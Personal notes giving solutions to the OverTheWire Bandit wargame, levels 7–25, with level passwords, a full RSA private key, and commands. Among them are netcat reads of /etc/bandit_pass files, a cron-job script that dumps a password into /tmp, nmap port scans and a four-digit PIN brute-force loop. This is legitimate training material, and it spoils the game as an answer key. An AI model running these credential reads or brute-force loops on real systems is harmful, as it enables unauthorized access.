## lvl

[Bandit | Over The Wire - Wargames](https://overthewire.org/wargames/bandit/)

## lvl 7 -> 8 
    TESKZC0XvTetK0S9xNwm25STk5iWrBvP
## lvl 11 -> 12         

    JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv


    find . -name "*.txt" -exec -wc -l 

## lvl 12 -> 13 
    psw = wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw

    xxd -r to reverse hexdump to bin
    gzip -d file.gz -> bzip2 -> tar -xfv file -> cat textfile

use comaand file to understand which is the decompression algo to use

## lvl 13 -> 14

    ssh -p 2220 -i ssh.key bandit14@overthe...

## lvl 14 -> 15
send a file to host:port

    nc -N localhost 30000 < /etc/bandit_pass/bandit14

    pwd = jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt

## lvl 15 -> 16
to create a ssl connection 
openssl s_client -connect localhost:30001

pwd = JQttfApK4SeyHwDlI9SXGR50qclOAil1

## lvl 16 -> 17
scan ports 

    nmap -T4 -sV -p 31000-32000

    openssl s_client -connect localhost:31790

for creating file use `nano`

    -----BEGIN RSA PRIVATE KEY-----
    MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
    imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
    Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
    DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
    JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
    x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
    KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
    J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
    d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
    YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
    vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
    +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
    8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
    SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
    HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
    SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
    R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
    Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
    R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
    L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
    blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
    YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
    77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
    dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
    vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
    -----END RSA PRIVATE KEY-----

change permissions give read rights only

    chmod 700 ssh.private 

## lvl 17 -> 18

    pwd = hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg

## lvl 18 -> 19
    ssh -p 2220 bandit18@bandit.labs.overthewire.org "cat ~/readme"

    pwd = awhqfNnAbc1naukrpqDYcF95h7HoMTrC

## lvl 19 -> 20
    ./bandit20-do cat /etc/bandit_pass/bandit20

    pwd = VxCazJaVykI6W36BkBU0mJTCM8rR95XT

## lvl 20 -> 21

    pwd = NvEJF7oVjkddltPSrdKEFOllh9V1IBcq

nc netcat create server with listening on port portnumber

    echo "pwd" | nc -l -p portnumber 

reads data from portnumber and print the next password

    ./suconnect portnumer 


## lvl 21 -> 22
    pwd = WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff

find cron job using 

    ls -la  /etc/cron.d/

read what it does (job for bandit22)
it says it run a script from 

    usr/bin/cronjob_bandit22.sh
read the file

    cat usr/bin/cronjob_bandit22.sh
it says outputs something to 

    /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

read it

    cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv


## lvl 22 -> 23
    pwd = QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

find cronojob file from /etx/cron.d/ for bandit23
read the script from /usr/

    echo I am user bandit23 | md5sum | cut -d ' ' -f 1
    cat /tmp/8ca319486bfbbc3663ea0fbe81326349

# banidt 23 -> 24

    pwd = VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

read the cron.d file and find the folder where we need copy the script

    /etc/cron.d/
    /usr/bin/conjob_... .sh

    /var/spool/bandit24/foo

create a temp dir using 

    mktemp -d

create a bash script

    !#/bin/bash

    mkdir -p /tmp/THIS_FOLDER/$(cat /etc/bandit_pass/bandit24)

change permissions of the folder, of the script.sh

    chmod 777 folder
    chmod +rx script.sh
    cp script.sh /var/spool/bandit24/foo/script.sh

wait for a minute

## lvl 24 -> 25
~~~bash
    #!/bin/bash

    for i in {0000..9999}; do 
        output=$(echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar ${i}" | nc localhost 30002)
        echo $output $i
        if [[ "$output" != *"Try again"* ]];
        then echo "$output"
        fi
    done;
~~~
~~~sh
    #!/bin/bash

    for i in {0000..9999}; do 
        echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar ${i}" >> output.txt
    done;

    cat output.txt | nc localhost 30002
~~~

    chmod +x script.sh
    cat output.txt | nc localhost 30002 > results.txt

## lvl 25 -> 26



